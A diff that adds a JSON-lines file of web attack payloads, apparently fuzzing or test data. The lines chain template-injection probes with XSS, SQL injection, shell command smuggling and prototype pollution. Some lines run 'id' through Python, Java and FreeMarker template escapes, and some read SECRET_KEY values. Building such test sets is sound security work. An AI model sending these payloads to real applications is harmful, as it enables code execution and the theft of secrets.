@@ -1,1 +1,30 @@
-{"key":"{{7*7}}<script>alert(1)</script>"}
+{"key": "{{7*7}}<script>alert(1)</script>"}
+{"key": "${7*7}<img src=x onerror=alert(1)>"}
+{"key": "#{7*7}<svg onload=alert(1)>"}
+{"key": "<%= 7*7 %><script>alert(1)</script>"}
+{"template": "{{config}}<script>alert(1)</script>"}
+{"data": "{{self.__dict__}}<img src=x onerror=alert(1)>"}
+{"value": "{{7*'7'}}<script>alert(1)</script>"}
+{"input": "{{''.__class__.mro()[2].__subclasses__()}}<img src=x onerror=alert(1)>"}
+{"name": "{{config.__class__.__init__.__globals__['os'].system('id')}}<script>alert(1)</script>"}
+{"url": "javascript:alert(1){{7*7}}"}
+{"redirect": "javascript:{{7*7}}alert(1)"}
+{"html": "<script>alert(1)</script>{{7*7}}"}
+{"content": "<img src=x onerror=alert(1)>{{7*7}}"}
+{"body": "{{7*7}}</p><script>alert(1)</script><p>"}
+{"message": "{{7*7}}'; alert(1);//"}
+{"text": "${7*7}<svg onload=alert(1)>; id;"}
+{"data": "{{7*7}}'><img src=x onerror=alert(1)>; id; OR 1=1--"}
+{"query": "{{7*7}}<script>alert(1)</script>' OR 1=1--; id;"}
+{"param": "${7*7}; id; '><img src=x onerror=alert(1)>"}
+{"value": "#{7*7}; id; '><svg onload=alert(1)>"}
+{"__proto__": {"polluted": "{{7*7}}<script>alert(1)</script>"}}
+{"constructor": {"prototype": {"polluted": "{{7*7}}<img src=x onerror=alert(1)>"}}}
+{"__proto__": {"__proto__": {"template": "{{7*7}}<script>alert(1)</script>"}}}
+{"key": "{{7*7}}", "xss": "<script>alert(1)</script>"}
+{"ssti": "{{7*7}}", "sqli": "' OR 1=1--", "xss": "<img src=x onerror=alert(1)>"}
+{"key": "{{config.SECRET_KEY}}<img src=x onerror=alert(1)>"}
+{"key": "{{request.environ.SECRET_KEY}}<script>alert(1)</script>"}
+{"key": "${T(java.lang.Runtime).getRuntime().exec('id')}<script>alert(1)</script>"}
+{"key": "#{T(java.lang.Runtime).getRuntime().exec('id')}<svg onload=alert(1)>"}
+{"key": "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}<script>alert(1)</script>"}
